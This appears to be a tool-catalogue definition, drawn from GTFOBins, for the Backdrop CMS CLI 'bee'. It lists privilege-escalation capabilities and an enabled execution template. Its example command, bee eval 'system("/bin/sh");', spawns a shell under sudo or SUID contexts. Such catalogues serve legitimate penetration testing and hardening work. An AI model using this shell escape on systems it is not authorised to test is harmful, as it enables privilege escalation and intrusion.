---
id: cms-backdrop-bee
namespace: cms:backdrop:bee
name: bee
description: Backdrop CMS command-line tool, can execute PHP code inherited from PHP binary.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.execution.command
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - php
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo or SUID execution context
  outputs:
    - type: process.output
      description: PHP code execution output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
  - bee
  - php
  - Bash
  - execFile
parameters:
  - name: php_code
    type: string
    required: false
    description: "PHP code to evaluate"
features:
  - process-manip
execution:
  template: "bee eval '{php_code}'"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Execute PHP code via bee eval
    command: bee eval 'system("/bin/sh");'
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/bee/"
techniques:
  - execution
  - privilege-escalation
install:
  - method: git
    package_name: "bee"
    commands:
      - "git clone https://github.com/backdrop-ops/bee.git"
---
